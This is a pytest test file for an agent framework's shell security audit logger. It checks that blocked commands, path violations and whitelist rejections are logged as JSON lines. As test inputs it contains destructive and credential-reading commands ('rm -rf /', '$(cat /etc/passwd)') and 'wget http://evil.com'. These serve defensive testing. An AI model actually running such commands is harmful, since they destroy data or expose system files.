"""Tests for per-agent shell security audit logger.

Covers:
- Normal path: audit file creation, entry formatting, per-agent isolation
- Abnormal path: disabled audit, unwritable directory, missing agent context
- Boundary: concurrent writes, very long commands, special characters in agent name
- Integration: audit events fired from security/path/validator/process pipelines
"""

import json
import re
import threading
from unittest.mock import MagicMock, patch

import pytest

from src.lib.runtime import RuntimeHome, bind_run_context, copy_runtime_context
from src.tools.shell.shell_audit_log import (
    ShellAuditLogger,
    get_shell_audit_logger,
    reset_audit_loggers,
)

# =========================================================================
# Fixtures
# =========================================================================

@pytest.fixture(autouse=True)
def _reset_loggers(tmp_path):
    """Bind every test to a canonical run and reset cached audit loggers."""
    reset_audit_loggers()
    runtime_context = RuntimeHome(tmp_path / ".agentloom").context(
        application_id="shell-audit-tests",
        task_id="task",
        run_id="run",
    )
    with bind_run_context(runtime_context):
        yield runtime_context
        reset_audit_loggers()


@pytest.fixture
def tmp_log_dir(tmp_path):
    """Provide a temporary directory for audit logs."""
    return str(tmp_path)


@pytest.fixture
def enabled_audit(tmp_log_dir):
    """Create an audit logger with audit enabled."""
    audit = ShellAuditLogger("test_agent")
    audit._enabled = True
    audit._log_success = False
    return audit


@pytest.fixture
def disabled_audit(tmp_log_dir):
    """Create an audit logger with audit disabled."""
    audit = ShellAuditLogger("test_agent")
    audit._enabled = False
    return audit


def _read_audit_file(audit: ShellAuditLogger) -> str:
    """Read the contents of the audit log file."""
    path = audit.file_path
    if path.exists():
        return path.read_text(encoding="utf-8")
    return ""


def _read_audit_events(audit: ShellAuditLogger) -> list[dict]:
    return [
        json.loads(line)
        for line in _read_audit_file(audit).splitlines()
        if line.strip()
    ]


# =========================================================================
# Normal path — audit file creation and entry formatting
# =========================================================================

class TestAuditFileCreation:
    """Verify that audit log files are created in the correct location."""

    def test_audit_file_created_on_first_write(self, enabled_audit):
        """Audit log file should be created lazily on first event."""
        assert not enabled_audit.file_path.exists()
        enabled_audit.log_security_block(
            command="rm -rf /",
            check_id="destructive_patterns",
            message="Blocked: destructive command detected",
        )
        assert enabled_audit.file_path.exists()

    def test_audit_uses_the_canonical_run_path(self, _reset_loggers):
        audit = ShellAuditLogger("my_agent")
        audit._enabled = True
        path = audit.file_path
        assert path == _reset_loggers.shell_audit_path
        assert path.name == "shell.jsonl"
        assert path.suffix == ".jsonl"

    def test_agent_name_is_metadata_not_a_path_component(self, _reset_loggers):
        audit = ShellAuditLogger("_global")
        audit._enabled = True
        audit.log_security_block("cmd", "check", "message")
        assert audit.file_path == _reset_loggers.shell_audit_path
        assert _read_audit_events(audit)[-1]["agent"] == "_global"


class TestEntryFormatting:
    """Verify structured entry format in the audit log."""

    def test_security_block_entry_format(self, enabled_audit):
        """Security block entry should contain all required fields."""
        enabled_audit.log_security_block(
            command="$(cat /etc/passwd)",
            check_id="command_substitution",
            message="Blocked: $() command substitution detected",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert re.match(r"\d{4}-\d{2}-\d{2}T", event["timestamp"])
        assert event["event_type"] == "SECURITY_BLOCK"
        assert event["agent"] == "test_agent"
        assert event["command"] == "$(cat /etc/passwd)"
        assert event["check_id"] == "command_substitution"
        assert event["message"] == "Blocked: $() command substitution detected"
        assert "command_substitution: false" in event["suggestion"]

    def test_path_violation_entry_format(self, enabled_audit):
        """Path violation entry should include the offending path."""
        enabled_audit.log_path_violation(
            command="cat /etc/passwd",
            message="'/etc/passwd' is outside allowed workspace",
            path="/etc/passwd",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "PATH_VIOLATION"
        assert event["command"] == "cat /etc/passwd"
        assert event["message"] == "'/etc/passwd' is outside allowed workspace"
        assert "path_validation" in event["suggestion"]
        assert "include_paths" in event["suggestion"]

    def test_whitelist_rejection_entry_format(self, enabled_audit):
        """Whitelist rejection should include the rejected command name."""
        enabled_audit.log_whitelist_rejection(
            command="wget http://evil.com",
            message="Command not allowed: wget. Allowed commands: ls, cat",
            name="wget",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "WHITELIST_REJECT"
        assert event["command"] == "wget http://evil.com"
        assert "allowed_commands" in event["suggestion"]

    def test_stall_detected_entry_format(self, enabled_audit):
        """Stall detection entry should include PID and elapsed time."""
        enabled_audit.log_stall_detected(
            command="npm install",
            pid=12345,
            elapsed=47.0,
            stall_message='Task "fg-12345" appears to be waiting for input',
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "STALL_DETECTED"
        assert event["details"]["pid"] == "12345"
        assert event["details"]["elapsed_seconds"] == "47.0"
        assert "non-interactive" in event["suggestion"].lower() or "--yes" in event["suggestion"]

    def test_timeout_entry_format(self, enabled_audit):
        """Timeout entry should include timeout duration."""
        enabled_audit.log_timeout(
            command="make build",
            timeout=120.0,
            promoted=False,
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "TIMEOUT"
        assert event["details"]["timeout_seconds"] == "120.0"
        assert "run_in_background" in event["suggestion"] or "timeout" in event["suggestion"].lower()

    def test_background_promotion_entry_format(self, enabled_audit):
        """Background promotion entry should include task ID."""
        enabled_audit.log_timeout(
            command="npm run dev",
            timeout=120.0,
            promoted=True,
            task_id="bg-abc-123",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "BACKGROUND_PROMOTION"
        assert event["details"]["task_id"] == "bg-abc-123"

    def test_sandbox_wrap_entry_format(self, enabled_audit):
        """Sandbox wrap entry should include sandbox mode."""
        enabled_audit.log_sandbox_wrap(
            command="npm install",
            sandbox_mode="seatbelt",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "SANDBOX_WRAP"
        assert "seatbelt" in event["message"]

    def test_sandbox_unavailable_entry_format(self, enabled_audit):
        """Sandbox unavailable entry should include mode and reason."""
        enabled_audit.log_sandbox_unavailable(
            command="npm install",
            sandbox_mode="bwrap",
            reason="bubblewrap is not installed",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "SANDBOX_UNAVAILABLE"
        assert "bwrap" in event["message"]
        assert "bubblewrap is not installed" in event["message"]

    def test_policy_snapshot_records_all_allow_defaults(self, enabled_audit):
        """Policy snapshot should make wildcard all-allow settings explicit."""
        def fake_config(key, *, default=None):
            values = {
                "allowed_commands": "*",
                "allowed_operators": "*",
                "security_checks": {
                    "command_substitution": True,
                    "destructive_patterns": True,
                },
                "dangerous_paths": ["/", "/etc", "/tmp"],
                "block_destructive": True,
                "sandbox": {
                    "enabled": False,
                    "mode": "bwrap",
                    "network_isolation": False,
                },
            }
            return values.get(key, default), "effective_agent_config"

        with patch(
            "src.tools.shell.shell_audit_log._get_shell_config_with_source",
            side_effect=fake_config,
        ):
            enabled_audit.log_effective_policy()

        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "POLICY_SNAPSHOT"
        assert event["details"]["allowed_commands"] == "* (all command names allowed)"
        assert event["details"]["allowed_operators"] == "* (all shell operators allowed)"
        assert event["details"]["command_success_logging"] == "false"
        assert event["details"]["sandbox_enabled"] == "false (effective_agent_config)"

    def test_policy_snapshot_logged_only_once(self, enabled_audit):
        """Repeated snapshot calls should not duplicate policy entries."""
        enabled_audit.log_effective_policy()
        enabled_audit.log_effective_policy()
        enabled_audit.log_security_block("cmd", "check", "msg")

        types = [event["event_type"] for event in _read_audit_events(enabled_audit)]
        assert types.count("POLICY_SNAPSHOT") == 1
        assert types.count("SECURITY_BLOCK") == 1

    def test_command_success_not_logged_by_default(self, enabled_audit):
        """Success events should NOT be logged when log_success=False."""
        enabled_audit.log_command_success(
            command="echo hello",
            exit_code=0,
            duration=0.5,
        )
        content = _read_audit_file(enabled_audit)
        assert content == ""

    def test_command_success_logged_when_enabled(self, enabled_audit):
        """Success events should be logged when log_success=True."""
        enabled_audit._log_success = True
        enabled_audit.log_command_success(
            command="echo hello",
            exit_code=0,
            duration=0.5,
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "COMMAND_SUCCESS"
        assert "exit_code=0" in event["message"]


class TestMultipleEntries:
    """Verify that multiple entries accumulate correctly."""

    def test_multiple_events_appended(self, enabled_audit):
        """Multiple events should append to the same file."""
        enabled_audit.log_security_block("cmd1", "check1", "msg1")
        enabled_audit.log_security_block("cmd2", "check2", "msg2")
        enabled_audit.log_path_violation("cmd3", "msg3", "/etc")

        types = [event["event_type"] for event in _read_audit_events(enabled_audit)]
        assert types.count("SECURITY_BLOCK") == 2
        assert types.count("PATH_VIOLATION") == 1

    def test_each_entry_is_one_json_line(self, enabled_audit):
        enabled_audit.log_security_block("cmd1", "check1", "msg1")
        enabled_audit.log_security_block("cmd2", "check2", "msg2")

        lines = _read_audit_file(enabled_audit).splitlines()
        assert len(lines) == 3  # one policy snapshot plus two events
        assert all(isinstance(json.loads(line), dict) for line in lines)


# =========================================================================
# Per-agent isolation
# =========================================================================

class TestPerAgentIsolation:
    """Verify that agent identity does not split one run's audit stream."""

    def test_different_agents_share_the_run_file_with_distinct_metadata(self):
        audit_a = ShellAuditLogger("agent_alpha")
        audit_a._enabled = True
        audit_a._log_policy_snapshot = False
        audit_b = ShellAuditLogger("agent_beta")
        audit_b._enabled = True
        audit_b._log_policy_snapshot = False

        audit_a.log_security_block("cmd_a", "check_a", "msg_a")
        audit_b.log_security_block("cmd_b", "check_b", "msg_b")

        assert audit_a.file_path == audit_b.file_path
        events = _read_audit_events(audit_a)
        assert {(event["agent"], event["command"]) for event in events} == {
            ("agent_alpha", "cmd_a"),
            ("agent_beta", "cmd_b"),
        }


# =========================================================================
# Abnormal path — disabled audit, errors
# =========================================================================

class TestDisabledAudit:
    """Verify behavior when audit logging is disabled."""

    def test_no_file_created_when_disabled(self, disabled_audit):
        """No audit file should be created when audit is disabled."""
        disabled_audit.log_security_block("cmd", "check", "msg")
        # File path is only lazily resolved; when disabled, _write_entry
        # returns immediately so file_path is never touched.
        assert disabled_audit._file_path is None

    def test_get_log_path_returns_none_when_disabled(self, disabled_audit):
        """get_log_path() should return None when disabled."""
        assert disabled_audit.get_log_path() is None


class TestErrorResilience:
    """Verify that audit logging errors never crash the shell pipeline."""

    def test_unwritable_directory_does_not_raise(self):
        """Writing to an unwritable directory should fail silently."""
        audit = ShellAuditLogger("test_agent")
        audit._enabled = True
        audit._sink._handler = MagicMock()
        audit._sink._handler.emit.side_effect = OSError("unwritable")

        # Should not raise
        audit.log_security_block("cmd", "check", "msg")

    def test_concurrent_writes_no_corruption(self, enabled_audit):
        """Concurrent writes from multiple threads should not corrupt."""
        errors = []

        def writer(idx):
            try:
                for i in range(20):
                    enabled_audit.log_security_block(
                        command=f"cmd_{idx}_{i}",
                        check_id=f"check_{idx}",
                        message=f"msg_{idx}_{i}",
                    )
            except Exception as e:
                errors.append(e)

        threads = []
        for index in range(5):
            thread_context = copy_runtime_context()
            threads.append(
                threading.Thread(
                    target=thread_context.run,
                    args=(writer, index),
                )
            )
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert not errors, f"Errors during concurrent writes: {errors}"

        events = _read_audit_events(enabled_audit)
        assert sum(event["event_type"] == "SECURITY_BLOCK" for event in events) == 100

    def test_multiple_agents_share_one_rotating_sink(self, _reset_loggers):
        """Concurrent agents must not race separate handlers during rollover."""
        audits = [
            ShellAuditLogger(
                f"agent_{index}",
                max_file_bytes=16 * 1024,
                backup_count=15,
            )
            for index in range(4)
        ]
        for audit in audits:
            audit._enabled = True
            audit._log_policy_snapshot = False

        def writer(agent_index):
            audit = audits[agent_index]
            for event_index in range(50):
                audit.log_security_block(
                    command=f"cmd_{agent_index}_{event_index}",
                    check_id="concurrent_rollover",
                    message="x" * 80,
                )

        threads = []
        for index in range(len(audits)):
            thread_context = copy_runtime_context()
            threads.append(
                threading.Thread(
                    target=thread_context.run,
                    args=(writer, index),
                )
            )
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        commands = set()
        for path in _reset_loggers.audit_dir.glob("shell.jsonl*"):
            for line in path.read_text(encoding="utf-8").splitlines():
                commands.add(json.loads(line)["command"])

        assert commands == {
            f"cmd_{agent_index}_{event_index}"
            for agent_index in range(4)
            for event_index in range(50)
        }


# =========================================================================
# Boundary conditions
# =========================================================================

class TestBoundaryConditions:
    """Test edge cases and boundary inputs."""

    def test_very_long_command_truncated(self, enabled_audit):
        """Commands longer than 500 chars should be truncated."""
        long_cmd = "echo " + "x" * 600
        enabled_audit.log_security_block(long_cmd, "check", "msg")

        content = _read_audit_file(enabled_audit)
        assert "..." in content
        # Full command should not appear
        assert long_cmd not in content

    def test_short_command_not_truncated(self, enabled_audit):
        """Commands within limit should not be truncated."""
        cmd = "echo hello"
        enabled_audit.log_security_block(cmd, "check", "msg")

        content = _read_audit_file(enabled_audit)
        assert "echo hello" in content
        assert "..." not in content

    def test_empty_command(self, enabled_audit):
        """Empty command string should still produce a valid entry."""
        enabled_audit.log_security_block("", "check", "msg")
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "SECURITY_BLOCK"
        assert event["command"] == ""

    def test_special_characters_in_agent_name_are_event_metadata(self):
        audit = ShellAuditLogger("agent/with spaces!@#")
        audit._enabled = True
        audit._log_policy_snapshot = False
        audit.log_security_block("cmd", "check", "message")
        assert _read_audit_events(audit)[-1]["agent"] == "agent/with spaces!@#"

    def test_unicode_in_command(self, enabled_audit):
        """Unicode characters in command should be written correctly."""
        enabled_audit.log_security_block(
            "echo '你好世界'", "check", "包含中文"
        )
        content = _read_audit_file(enabled_audit)
        assert "你好世界" in content
        assert "包含中文" in content

    def test_newlines_in_message(self, enabled_audit):
        """Messages with newlines should still produce valid entries."""
        enabled_audit.log_security_block(
            "cmd", "check", "line1\nline2\nline3"
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert event["event_type"] == "SECURITY_BLOCK"
        assert event["message"] == "line1\nline2\nline3"

    def test_run_sink_is_stable(self):
        audit1 = ShellAuditLogger("same_agent")
        audit1._enabled = True
        # Force file creation for audit1
        audit1.log_security_block("cmd1", "c1", "m1")

        audit2 = ShellAuditLogger("same_agent")
        audit2._enabled = True
        # Runtime isolation is keyed by RuntimeContext rather than timestamps.
        path2 = audit2.file_path
        assert path2.name == "shell.jsonl"
        assert path2 == audit1.file_path


# =========================================================================
# Factory function (get_shell_audit_logger)
# =========================================================================

class TestGetShellAuditLogger:
    """Test the factory/singleton accessor."""

    def test_returns_same_instance_for_same_agent(self, tmp_log_dir):
        """Same agent name should return the same cached instance."""
        a1 = get_shell_audit_logger("agent_x")
        a2 = get_shell_audit_logger("agent_x")
        assert a1 is a2

    def test_returns_different_instances_for_different_agents(self, tmp_log_dir):
        """Different agent names should return different instances."""
        a1 = get_shell_audit_logger("agent_x")
        a2 = get_shell_audit_logger("agent_y")
        assert a1 is not a2

    def test_fallback_to_global_when_no_agent_context(self, tmp_log_dir):
        """Should fall back to _global when no agent context."""
        with patch("src.trace.task_context.get_current_agent_name",
                    side_effect=Exception("no context")):
            audit = get_shell_audit_logger()
        # We can't check the name directly since the factory may have
        # caught the exception; just verify it returns an instance.
        assert isinstance(audit, ShellAuditLogger)

    def test_reset_clears_cache(self, tmp_log_dir):
        """reset_audit_loggers() should clear the cache."""
        a1 = get_shell_audit_logger("agent_x")
        reset_audit_loggers()
        a2 = get_shell_audit_logger("agent_x")
        assert a1 is not a2


# =========================================================================
# Config integration
# =========================================================================

class TestConfigIntegration:
    """Verify that config values are read correctly."""

    def test_enabled_reads_from_config(self, tmp_log_dir):
        """enabled property should read from tools.shell.audit_log.enabled."""
        audit = ShellAuditLogger("test")
        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
            mock_c.get_nested.return_value = False
            assert audit.enabled is False

    def test_enabled_coerces_string_true(self, tmp_log_dir):
        """String 'true' should be coerced to boolean True."""
        audit = ShellAuditLogger("test")
        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
            mock_c.get_nested.return_value = "true"
            assert audit.enabled is True

    def test_enabled_coerces_string_false(self, tmp_log_dir):
        """String 'false' should be coerced to boolean False."""
        audit = ShellAuditLogger("test")
        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
            mock_c.get_nested.return_value = "false"
            assert audit.enabled is False

    def test_log_success_default_false(self, tmp_log_dir):
        """log_success should default to False."""
        audit = ShellAuditLogger("test")
        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
            mock_c.get_nested.return_value = False
            assert audit.log_success is False


# =========================================================================
# Integration with security pipeline
# =========================================================================

class TestSecurityPipelineIntegration:
    """Verify audit events are fired from the security check pipeline."""

    def test_security_block_triggers_audit(self, tmp_log_dir):
        """check_command_security() should trigger audit on block."""
        from src.tools.shell.security import check_command_security

        mock_audit = MagicMock()
        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
                    return_value=mock_audit):
            with patch("src.tools.shell.security._load_enabled_checks",
                        return_value={}):
                # This command should trigger destructive_patterns check
                results = check_command_security("rm -rf /")

            if results:
                mock_audit.log_security_block.assert_called()

    def test_path_violation_triggers_audit(self, tmp_log_dir):
        """check_path_constraints() should trigger audit on violation."""
        from src.tools.shell.path_validation import check_path_constraints

        mock_audit = MagicMock()
        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
                    return_value=mock_audit):
            with patch("src.tools.shell.path_validation._build_allowed_roots",
                        return_value=["."]):
                with patch("src.tools.shell.path_validation._load_dangerous_paths",
                            return_value=["/"]):
                    with patch("src.tools.shell.path_validation._is_block_destructive",
                                return_value=True):
                        try:
                            check_path_constraints("rm -rf /etc/passwd")
                        except ValueError:
                            pass

            # Audit should have been triggered (if path violation detected)
            # The exact behavior depends on path resolution

    def test_whitelist_rejection_triggers_audit(self, tmp_log_dir):
        """validate_command() should trigger audit on whitelist rejection."""
        from src.tools.shell.validator import validate_command

        mock_audit = MagicMock()
        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
                    return_value=mock_audit):

            with patch("src.tools.shell.validator.validate_command_security"):
                with patch("src.tools.shell.validator.check_path_constraints"):
                    with patch("src.tools.shell.validator.load_allowed_commands",
                                return_value=["ls", "cat"]):
                        with patch("src.tools.shell.validator.load_allowed_operators",
                                    return_value=[]):
                            try:
                                validate_command("wget http://evil.com")
                            except ValueError:
                                pass

            mock_audit.log_whitelist_rejection.assert_called_once()
            call_args = mock_audit.log_whitelist_rejection.call_args
            assert "wget" in call_args.kwargs.get("name", "") or \
                   "wget" in str(call_args)

    def test_whitelist_rejection_logs_effective_allow_lists(self, enabled_audit):
        """Rejected commands/operators should log the effective explicit allow-list."""
        from src.tools.shell.validator import validate_command

        with patch(
            "src.tools.shell.shell_audit_log.get_shell_audit_logger",
            return_value=enabled_audit,
        ):
            with patch("src.tools.shell.validator.validate_command_security"):
                with patch("src.tools.shell.validator.check_path_constraints"):
                    with patch(
                        "src.tools.shell.validator.load_allowed_commands",
                        return_value=["pwd", "echo", "cat"],
                    ):
                        with patch(
                            "src.tools.shell.validator.load_allowed_operators",
                            return_value=["|", "&&"],
                        ):
                            with pytest.raises(ValueError):
                                validate_command("date")
                            with pytest.raises(ValueError):
                                validate_command("echo a ; echo b")

        events = _read_audit_events(enabled_audit)
        assert any("Command not allowed: date. Allowed commands: cat, echo, pwd" in event.get("message", "") for event in events)
        operator = next(event for event in events if "Operator not allowed" in event.get("message", ""))
        assert 'allowed_operators: [";", ...]' in operator["suggestion"]
        assert 'allowed_commands: [";", ...]' not in operator["suggestion"]


# =========================================================================
# Suggestion quality
# =========================================================================

class TestSuggestionContent:
    """Verify that suggestions are actionable and reference correct YAML paths."""

    def test_security_block_suggestion_references_yaml(self, enabled_audit):
        """Security block suggestion should tell user which YAML key to change."""
        enabled_audit.log_security_block(
            "$(evil)", "command_substitution", "Blocked"
        )
        content = _read_audit_file(enabled_audit)
        assert "security_checks:" in content
        assert "command_substitution: false" in content

    def test_path_violation_suggestion_references_path_validation(self, enabled_audit):
        """Path violation suggestion should reference path_validation."""
        enabled_audit.log_path_violation(
            "cat /opt/data", "outside workspace", "/opt/data"
        )
        content = _read_audit_file(enabled_audit)
        assert "path_validation" in content
        assert "include_paths" in content
        assert "/opt/data" in content

    def test_whitelist_suggestion_references_allowed_commands(self, enabled_audit):
        """Whitelist rejection suggestion should reference allowed_commands."""
        enabled_audit.log_whitelist_rejection(
            "wget url", "not allowed", "wget"
        )
        content = _read_audit_file(enabled_audit)
        assert "allowed_commands" in content
        assert "wget" in content

    def test_operator_suggestion_references_allowed_operators(self, enabled_audit):
        """Operator rejection suggestion should reference allowed_operators."""
        enabled_audit.log_whitelist_rejection(
            "echo hello ; echo world",
            "Operator not allowed: ;. Allowed operators: &&, |",
            ";",
        )
        event = _read_audit_events(enabled_audit)[-1]
        assert "allowed_operators" in event["suggestion"]
        assert '[";", ...]' in event["suggestion"]
        assert 'allowed_commands: [";", ...]' not in event["suggestion"]

    def test_stall_suggestion_mentions_non_interactive(self, enabled_audit):
        """Stall suggestion should mention non-interactive flags."""
        enabled_audit.log_stall_detected("npm i", 1234, 45.0, "prompt detected")
        content = _read_audit_file(enabled_audit)
        assert "--yes" in content or "-y" in content or "non-interactive" in content.lower()

    def test_timeout_suggestion_mentions_background(self, enabled_audit):
        """Timeout suggestion should mention background execution."""
        enabled_audit.log_timeout("make build", 120.0, promoted=False)
        content = _read_audit_file(enabled_audit)
        assert "run_in_background" in content or "timeout" in content.lower()
